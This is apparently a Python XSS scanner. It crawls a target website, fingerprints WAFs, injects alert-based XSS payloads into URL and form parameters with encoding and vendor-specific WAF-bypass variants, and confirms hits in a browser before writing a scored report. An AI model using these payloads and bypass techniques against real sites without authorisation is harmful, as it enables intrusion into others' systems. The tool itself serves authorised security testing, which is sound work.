#!/usr/bin/env python3
"""
Advanced XSS Scanner - Professional Version
Enhanced reconnaissance + Smart validation + WAF bypass + Scoring system
Author: AI Assistant
Version: 10.0 Advanced
"""

import requests
import re
import urllib.parse
import time
import json
import threading
import os
import base64
import html
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from bs4 import BeautifulSoup
import argparse
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import datetime
import random

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Initialize colorama
init()

class AdvancedXSSScanner:
    def __init__(self, target_url, max_threads=10, delay=0.1, max_depth=4, timeout=10):
        self.target_url = target_url
        self.max_threads = max_threads
        self.delay = delay
        self.max_depth = max_depth
        self.timeout = timeout
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Data structures
        self.visited_urls = set()
        self.discovered_params = set()
        self.confirmed_vulnerabilities = []
        self.waf_info = {}
        self.lock = threading.Lock()
        
        # Browser for validation
        self.browser = None
        self.playwright = None
        
        # Enhanced payloads with encoding
        self.payloads = self._load_advanced_payloads()
        self.waf_bypass_encodings = self._load_waf_bypass_techniques()
        
        # Create directories
        os.makedirs('screenshots', exist_ok=True)
        os.makedirs('reports', exist_ok=True)
    
    def log(self, message, level="INFO"):
        """Enhanced logging with better colors"""
        colors = {
            "INFO": Fore.WHITE,  # Changed from CYAN to WHITE
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.GREEN + Style.BRIGHT,  # Changed from MAGENTA to GREEN
            "PHASE": Fore.CYAN + Style.BRIGHT,
            "TEST": Fore.WHITE,  # Changed from BLUE to WHITE
            "WAF": Fore.YELLOW + Style.BRIGHT,
            "SCORE": Fore.GREEN + Style.BRIGHT
        }
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, Fore.WHITE)}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def _load_advanced_payloads(self):
        """Load advanced context-aware XSS payloads"""
        return {
            'html': [
                '<script>alert("XSS_CONFIRMED")</script>',
                '<img src=x onerror=alert("XSS_CONFIRMED")>',
                '<svg onload=alert("XSS_CONFIRMED")>',
                '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
                '<body onload=alert("XSS_CONFIRMED")>',
                '<details ontoggle=alert("XSS_CONFIRMED")>',
                '<marquee onstart=alert("XSS_CONFIRMED")>',
                '<video><source onerror=alert("XSS_CONFIRMED")>'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS_CONFIRMED\')" x="',
                "' onmouseover='alert(\"XSS_CONFIRMED\")' x='",
                '" onfocus="alert(\'XSS_CONFIRMED\')" autofocus="',
                "' onfocus='alert(\"XSS_CONFIRMED\")' autofocus='",
                '" onclick="alert(\'XSS_CONFIRMED\')" x="',
                '" onload="alert(\'XSS_CONFIRMED\')" x="'
            ],
            'javascript': [
                '";alert("XSS_CONFIRMED");//',
                "';alert('XSS_CONFIRMED');//",
                '";prompt("XSS_CONFIRMED");//',
                "';prompt('XSS_CONFIRMED');//",
                '");alert("XSS_CONFIRMED");//',
                "');alert('XSS_CONFIRMED');//"
            ],
            'css': [
                'url("javascript:alert(\'XSS_CONFIRMED\')")',
                'expression(alert("XSS_CONFIRMED"))'
            ]
        }
    
    def _load_waf_bypass_techniques(self):
        """Load WAF bypass encoding techniques"""
        return {
            'url_encoding': lambda x: urllib.parse.quote(x),
            'double_url_encoding': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'html_encoding': lambda x: html.escape(x),
            'base64_encoding': lambda x: base64.b64encode(x.encode()).decode(),
            'unicode_encoding': lambda x: x.encode('unicode_escape').decode(),
            'case_variation': lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            'null_byte': lambda x: x.replace('script', 'scri\x00pt'),
            'comment_injection': lambda x: x.replace('script', 'scr/**/ipt'),
            'tab_newline': lambda x: x.replace(' ', '\t').replace('>', '>\n')
        }
    
    def detect_waf(self, url):
        """Detect WAF presence and type"""
        self.log("Detecting WAF...", "WAF")
        
        waf_signatures = {
            'cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'aws_waf': ['awsalb', 'awsalbcors'],
            'akamai': ['akamai', '_akamai'],
            'incapsula': ['incap_ses', 'visid_incap'],
            'sucuri': ['sucuri', 'x-sucuri'],
            'barracuda': ['barra', 'barracuda'],
            'f5_bigip': ['bigip', 'f5-bigip'],
            'mod_security': ['mod_security', 'modsecurity']
        }
        
        try:
            # Test with suspicious payload
            test_payload = '<script>alert(1)</script>'
            response = self.session.get(f"{url}?test={test_payload}", timeout=self.timeout)
            
            # Check response headers and content
            headers_str = str(response.headers).lower()
            content_str = response.text.lower()
            
            detected_wafs = []
            for waf_name, signatures in waf_signatures.items():
                for signature in signatures:
                    if signature in headers_str or signature in content_str:
                        detected_wafs.append(waf_name)
                        break
            
            # Check for common WAF response patterns
            waf_patterns = [
                'access denied',
                'blocked',
                'security violation',
                'suspicious activity',
                'web application firewall',
                'waf',
                'forbidden'
            ]
            
            for pattern in waf_patterns:
                if pattern in content_str and response.status_code in [403, 406, 429, 503]:
                    detected_wafs.append('generic_waf')
                    break
            
            if detected_wafs:
                unique_wafs = list(set(detected_wafs))
                self.waf_info[url] = unique_wafs
                self.log(f"WAF detected: {', '.join(unique_wafs)}", "WAF")
                return unique_wafs
            else:
                self.log("No WAF detected", "WAF")
                return []
                
        except Exception as e:
            self.log(f"WAF detection error: {str(e)}", "ERROR")
            return []
    
    def bypass_waf_payload(self, payload, waf_types=None):
        """Apply WAF bypass techniques to payload"""
        if not waf_types:
            return [payload]
        
        bypassed_payloads = [payload]
        
        # Apply different encoding techniques
        for technique_name, technique_func in self.waf_bypass_encodings.items():
            try:
                bypassed_payload = technique_func(payload)
                if bypassed_payload != payload:
                    bypassed_payloads.append(bypassed_payload)
            except:
                continue
        
        # WAF-specific bypasses
        if 'cloudflare' in waf_types:
            # Cloudflare specific bypasses
            cf_bypasses = [
                payload.replace('script', 'SCRIPT'),
                payload.replace('<script>', '<ScRiPt>'),
                payload.replace('alert', 'prompt'),
                payload.replace('>', '>\u0020')
            ]
            bypassed_payloads.extend(cf_bypasses)
        
        if 'mod_security' in waf_types:
            # ModSecurity specific bypasses
            mod_bypasses = [
                payload.replace('script', 'scr\tipt'),
                payload.replace(' ', '\t'),
                payload.replace('=', '\u003d')
            ]
            bypassed_payloads.extend(mod_bypasses)
        
        return list(set(bypassed_payloads))
    
    def calculate_vulnerability_score(self, vuln_data):
        """Calculate vulnerability score based on multiple factors"""
        score = 0
        
        # Base score for confirmed XSS
        if vuln_data.get('confirmed', False):
            score += 50
        
        # Context scoring
        context = vuln_data.get('context', 'html')
        context_scores = {
            'html': 30,
            'attribute': 25,
            'javascript': 35,
            'css': 20
        }
        score += context_scores.get(context, 20)
        
        # Parameter type scoring
        param_name = vuln_data.get('parameter', '').lower()
        if any(keyword in param_name for keyword in ['search', 'query', 'q']):
            score += 10  # High exposure parameters
        
        # WAF bypass bonus
        if vuln_data.get('waf_bypassed', False):
            score += 15
        
        # Screenshot confirmation bonus
        if vuln_data.get('screenshot'):
            score += 10
        
        # Alert execution bonus
        if 'XSS_CONFIRMED' in vuln_data.get('alert_message', ''):
            score += 20
        
        return min(score, 100)  # Cap at 100
    
    def phase1_enhanced_reconnaissance(self):
        """Enhanced reconnaissance with parallel processing"""
        self.log("=" * 80, "PHASE")
        self.log("PHASE 1: ENHANCED RECONNAISSANCE", "PHASE")
        self.log("=" * 80, "PHASE")
        
        try:
            # Test target
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
            
            # Detect WAF
            waf_types = self.detect_waf(self.target_url)
            
            # Enhanced crawling with threading
            discovered_data = self._enhanced_crawl_parallel()
            
            self.log(f"Discovered {len(discovered_data['urls'])} URLs", "SUCCESS")
            self.log(f"Found {len(discovered_data['forms'])} forms", "SUCCESS")
            self.log(f"Identified {len(discovered_data['url_params'])} URL parameters", "SUCCESS")
            self.log(f"Identified {len(discovered_data['form_params'])} form parameters", "SUCCESS")
            
            return discovered_data
            
        except Exception as e:
            self.log(f"Phase 1 failed: {str(e)}", "ERROR")
            return None
    
    def _enhanced_crawl_parallel(self):
        """Enhanced parallel crawling"""
        urls_to_visit = [(self.target_url, 0)]
        discovered_urls = set()
        all_forms = []
        all_url_params = set()
        all_form_params = set()
        base_domain = urlparse(self.target_url).netloc
        
        # Use ThreadPoolExecutor for parallel processing
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while urls_to_visit:
                current_batch = []
                for _ in range(min(self.max_threads, len(urls_to_visit))):
                    if urls_to_visit:
                        current_batch.append(urls_to_visit.pop(0))
                
                if not current_batch:
                    break
                
                # Submit batch for parallel processing
                future_to_url = {}
                for url, depth in current_batch:
                    if (url not in self.visited_urls and 
                        depth <= self.max_depth and 
                        url not in discovered_urls):
                        future = executor.submit(self._crawl_single_url, url, depth, base_domain)
                        future_to_url[future] = (url, depth)
                
                # Process results
                for future in as_completed(future_to_url):
                    url, depth = future_to_url[future]
                    try:
                        result = future.result()
                        if result:
                            discovered_urls.add(url)
                            self.visited_urls.add(url)
                            
                            all_forms.extend(result['forms'])
                            all_url_params.update(result['url_params'])
                            all_form_params.update(result['form_params'])
                            
                            # Add new URLs to queue
                            for new_url in result['links']:
                                if (new_url not in discovered_urls and 
                                    new_url not in self.visited_urls and
                                    depth < self.max_depth):
                                    urls_to_visit.append((new_url, depth + 1))
                    
                    except Exception as e:
                        self.log(f"Error processing {url}: {str(e)}", "ERROR")
                        continue
                
                time.sleep(self.delay)
        
        return {
            'urls': list(discovered_urls),
            'forms': all_forms,
            'url_params': list(all_url_params),
            'form_params': list(all_form_params)
        }
    
    def _crawl_single_url(self, url, depth, base_domain):
        """Crawl a single URL"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            response.raise_for_status()
            
            # Extract parameters and forms
            parsed_url = urlparse(url)
            url_params = set(parse_qs(parsed_url.query).keys())
            
            # Extract forms
            forms = self._extract_forms_enhanced(response.text, url)
            form_params = set()
            for form in forms:
                for input_field in form['inputs']:
                    if input_field['name']:
                        form_params.add(input_field['name'])
            
            # Extract links
            links = self._extract_links_enhanced(response.text, url, base_domain)
            
            return {
                'url_params': url_params,
                'form_params': form_params,
                'forms': forms,
                'links': links
            }
            
        except Exception as e:
            return None
    
    def _extract_forms_enhanced(self, html_content, base_url):
        """Enhanced form extraction"""
        forms = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_data = {
                'url': base_url,
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                }
                form_data['inputs'].append(input_data)
            
            if form_data['action']:
                form_data['action'] = urljoin(base_url, form_data['action'])
            else:
                form_data['action'] = base_url
            
            forms.append(form_data)
        
        return forms
    
    def _extract_links_enhanced(self, html_content, base_url, base_domain):
        """Enhanced link extraction"""
        links = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Extract from <a> tags
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href and not href.startswith('#') and not href.startswith('javascript:'):
                full_url = urljoin(base_url, href)
                parsed = urlparse(full_url)
                if parsed.netloc == base_domain and not self._is_static_resource(full_url):
                    links.append(full_url)
        
        return links
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf']
        return any(url.lower().endswith(ext) for ext in static_extensions)
    
    def phase2_smart_validation(self, recon_data):
        """Smart XSS validation with browser confirmation"""
        self.log("=" * 80, "PHASE")
        self.log("PHASE 2: SMART XSS VALIDATION", "PHASE")
        self.log("=" * 80, "PHASE")
        
        if not PLAYWRIGHT_AVAILABLE:
            self.log("Playwright not available, skipping browser validation", "WARNING")
            return
        
        if not self._init_browser():
            self.log("Browser initialization failed", "ERROR")
            return
        
        try:
            # Test all parameters with scoring
            self._test_all_parameters_scored(recon_data)
            
        finally:
            self._close_browser()
    
    def _init_browser(self):
        """Initialize browser with better error handling"""
        try:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(
                headless=False,  # Show browser for live demonstration
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            return True
        except Exception as e:
            self.log(f"Browser init error: {str(e)}", "ERROR")
            return False
    
    def _close_browser(self):
        """Close browser"""
        try:
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
        except Exception:
            pass
    
    def _test_all_parameters_scored(self, recon_data):
        """Test parameters with scoring system"""
        # Test URL parameters
        for url in recon_data['urls']:
            self._test_url_parameters_scored(url)
        
        # Test form parameters
        for form in recon_data['forms']:
            self._test_form_parameters_scored(form)
    
    def _test_url_parameters_scored(self, url):
        """Test URL parameters with scoring"""
        parsed_url = urlparse(url)
        url_params = parse_qs(parsed_url.query)
        
        for param_name in url_params:
            self.log(f"Testing URL parameter: {param_name} on {url}", "TEST")
            
            # Get WAF bypass payloads
            waf_types = self.waf_info.get(url, [])
            base_payloads = self.payloads['html']
            
            for base_payload in base_payloads:
                bypass_payloads = self.bypass_waf_payload(base_payload, waf_types)
                
                for payload in bypass_payloads:
                    self.log(f"Testing payload: {payload[:50]}...", "TEST")
                    
                    success = self._validate_xss_browser_scored(url, None, payload, param_name, waf_types)
                    if success:
                        break
                
                if success:
                    break
    
    def _test_form_parameters_scored(self, form):
        """Test form parameters with scoring"""
        for input_field in form['inputs']:
            if input_field['name']:
                self.log(f"Testing form parameter: {input_field['name']} on {form['action']}", "TEST")
                
                waf_types = self.waf_info.get(form['action'], [])
                base_payloads = self.payloads['html']
                
                for base_payload in base_payloads:
                    bypass_payloads = self.bypass_waf_payload(base_payload, waf_types)
                    
                    for payload in bypass_payloads:
                        form_data = {}
                        for field in form['inputs']:
                            if field['name'] == input_field['name']:
                                form_data[field['name']] = payload
                            else:
                                form_data[field['name']] = field['value']
                        
                        success = self._validate_xss_browser_scored(form['action'], form_data, payload, input_field['name'], waf_types)
                        if success:
                            break
                    
                    if success:
                        break
    
    def _validate_xss_browser_scored(self, url, form_data, payload, param_name, waf_types):
        """Browser validation with scoring system"""
        try:
            context = self.browser.new_context()
            page = context.new_page()
            
            # Set up alert handler
            alert_triggered = False
            alert_message = ""
            
            def handle_dialog(dialog):
                nonlocal alert_triggered, alert_message
                alert_triggered = True
                alert_message = dialog.message
                dialog.accept()
            
            page.on("dialog", handle_dialog)
            
            if form_data:
                # Form submission
                page.goto(url, wait_until="domcontentloaded", timeout=30000)
                
                # Fill form
                for field_name, field_value in form_data.items():
                    try:
                        page.fill(f'[name="{field_name}"]', str(field_value))
                    except:
                        continue
                
                # Submit form
                try:
                    page.click('input[type="submit"], button[type="submit"], button')
                except:
                    pass
                
                page.wait_for_load_state("domcontentloaded", timeout=30000)
            else:
                # Direct URL
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                page.goto(test_url, wait_until="domcontentloaded", timeout=30000)
            
            # Wait for XSS execution
            time.sleep(3)
            
            # Check if XSS was triggered
            if alert_triggered and "XSS_CONFIRMED" in alert_message:
                # Take screenshot ONLY after confirmation
                screenshot_path = self._take_screenshot(page, param_name, payload)
                
                # Calculate score
                vuln_data = {
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'context': 'html',
                    'screenshot': screenshot_path,
                    'timestamp': datetime.datetime.now().isoformat(),
                    'alert_message': alert_message,
                    'confirmed': True,
                    'waf_bypassed': len(waf_types) > 0
                }
                
                score = self.calculate_vulnerability_score(vuln_data)
                vuln_data['score'] = score
                
                with self.lock:
                    self.confirmed_vulnerabilities.append(vuln_data)
                    self.log(f"✅ CONFIRMED XSS! Parameter: {param_name}", "VULN")
                    self.log(f"Score: {score}/100", "SCORE")
                    if screenshot_path:
                        self.log(f"Screenshot: {screenshot_path}", "VULN")
                
                context.close()
                return True
            
            context.close()
            return False
            
        except Exception as e:
            self.log(f"Browser validation error: {str(e)}", "ERROR")
            return False
    
    def _take_screenshot(self, page, param_name, payload):
        """Take screenshot after XSS confirmation"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_param = re.sub(r'[^\w\-_]', '_', param_name)
            
            filename = f"confirmed_xss_{safe_param}_{timestamp}.png"
            screenshot_path = os.path.join('screenshots', filename)
            
            page.screenshot(path=screenshot_path, full_page=True)
            return screenshot_path
            
        except Exception as e:
            self.log(f"Screenshot error: {str(e)}", "ERROR")
            return None
    
    def generate_advanced_report(self):
        """Generate advanced HTML report with scoring"""
        self.log("Generating advanced report...", "INFO")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join('reports', f'advanced_xss_report_{timestamp}.html')
        
        # Calculate statistics
        total_vulns = len(self.confirmed_vulnerabilities)
        confirmed_vulns = len([v for v in self.confirmed_vulnerabilities if v.get('confirmed', False)])
        avg_score = sum(v.get('score', 0) for v in self.confirmed_vulnerabilities) / max(total_vulns, 1)
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Advanced XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; }}
        .container {{ max-width: 1200px; margin: 20px auto; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; padding: 30px; }}
        .stat {{ background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; }}
        .stat-number {{ font-size: 2.5em; font-weight: bold; margin-bottom: 10px; }}
        .vulnerability {{ background: #f8f9fa; border-left: 5px solid #28a745; margin: 20px; padding: 25px; border-radius: 8px; }}
        .vulnerability.high-score {{ border-left-color: #dc3545; }}
        .vulnerability.medium-score {{ border-left-color: #ffc107; }}
        .screenshot {{ max-width: 100%; border: 1px solid #ddd; border-radius: 8px; margin: 15px 0; }}
        .score-badge {{ display: inline-block; background: #28a745; color: white; padding: 5px 15px; border-radius: 20px; font-weight: bold; }}
        .score-badge.high {{ background: #dc3545; }}
        .score-badge.medium {{ background: #ffc107; color: #333; }}
        .waf-info {{ background: #e9ecef; padding: 10px; border-radius: 5px; margin: 10px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Advanced XSS Scanner Report</h1>
            <p>Target: {self.target_url}</p>
            <p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-number">{total_vulns}</div>
                <div>Total Vulnerabilities</div>
            </div>
            <div class="stat">
                <div class="stat-number">{confirmed_vulns}</div>
                <div>Confirmed XSS</div>
            </div>
            <div class="stat">
                <div class="stat-number">{avg_score:.1f}</div>
                <div>Average Score</div>
            </div>
            <div class="stat">
                <div class="stat-number">{len(self.visited_urls)}</div>
                <div>URLs Scanned</div>
            </div>
        </div>
        
        <div style="padding: 30px;">
            <h2>🎯 Vulnerability Details</h2>
"""
        
        if not self.confirmed_vulnerabilities:
            html_content += '<div style="text-align: center; padding: 40px; color: #28a745; font-size: 1.2em;">✅ No vulnerabilities found</div>'
        else:
            for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
                score = vuln.get('score', 0)
                score_class = 'high' if score >= 80 else 'medium' if score >= 60 else 'low'
                vuln_class = f"{score_class}-score"
                
                html_content += f"""
                <div class="vulnerability {vuln_class}">
                    <h3>🔍 Vulnerability #{i} <span class="score-badge {score_class}">Score: {score}/100</span></h3>
                    <p><strong>URL:</strong> {vuln['url']}</p>
                    <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                    <p><strong>Payload:</strong> <code>{html.escape(vuln['payload'])}</code></p>
                    <p><strong>Context:</strong> {vuln.get('context', 'N/A')}</p>
                    <p><strong>Confirmed:</strong> {'✅ Yes' if vuln.get('confirmed', False) else '⚠️ Potential'}</p>
                    <p><strong>WAF Bypassed:</strong> {'✅ Yes' if vuln.get('waf_bypassed', False) else '❌ No'}</p>
                    <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
                    
                    {f'<img src="../{vuln["screenshot"]}" alt="XSS Screenshot" class="screenshot">' if vuln.get('screenshot') else ''}
                </div>
"""
        
        html_content += """
        </div>
    </div>
</body>
</html>
"""
        
        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.log(f"Advanced report generated: {report_path}", "SUCCESS")
            return report_path
            
        except Exception as e:
            self.log(f"Error generating report: {str(e)}", "ERROR")
            return None
    
    def scan(self):
        """Main scanning method"""
        start_time = time.time()
        
        self.log("🚀 Starting Advanced XSS Scanner v10.0", "SUCCESS")
        self.log(f"Target: {self.target_url}", "INFO")
        
        try:
            # Phase 1: Enhanced reconnaissance
            recon_data = self.phase1_enhanced_reconnaissance()
            if not recon_data:
                return
            
            # Phase 2: Smart validation
            self.phase2_smart_validation(recon_data)
            
            # Generate report
            report_path = self.generate_advanced_report()
            
            # Show results
            self._show_final_results(report_path)
            
            elapsed_time = time.time() - start_time
            self.log(f"Scan completed in {elapsed_time:.2f} seconds", "SUCCESS")
            
        except Exception as e:
            self.log(f"Scan failed: {str(e)}", "ERROR")
    
    def _show_final_results(self, report_path):
        """Show final results with scoring"""
        self.log("=" * 80, "PHASE")
        self.log("SCAN RESULTS", "PHASE")
        self.log("=" * 80, "PHASE")
        
        total_vulns = len(self.confirmed_vulnerabilities)
        confirmed_vulns = len([v for v in self.confirmed_vulnerabilities if v.get('confirmed', False)])
        
        self.log(f"Total vulnerabilities: {total_vulns}", "SUCCESS")
        self.log(f"Confirmed XSS: {confirmed_vulns}", "SUCCESS")
        
        if self.confirmed_vulnerabilities:
            avg_score = sum(v.get('score', 0) for v in self.confirmed_vulnerabilities) / total_vulns
            self.log(f"Average score: {avg_score:.1f}/100", "SCORE")
            
            high_score_vulns = [v for v in self.confirmed_vulnerabilities if v.get('score', 0) >= 80]
            if high_score_vulns:
                self.log(f"High-risk vulnerabilities: {len(high_score_vulns)}", "WARNING")
        
        if report_path:
            self.log(f"📊 Advanced Report: {report_path}", "SUCCESS")

def main():
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner v10.0')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1)')
    parser.add_argument('--depth', type=int, default=4, help='Crawling depth (default: 4)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    scanner = AdvancedXSSScanner(
        args.url,
        args.threads,
        args.delay,
        args.depth,
        args.timeout
    )
    
    scanner.scan()

if __name__ == "__main__":
    main()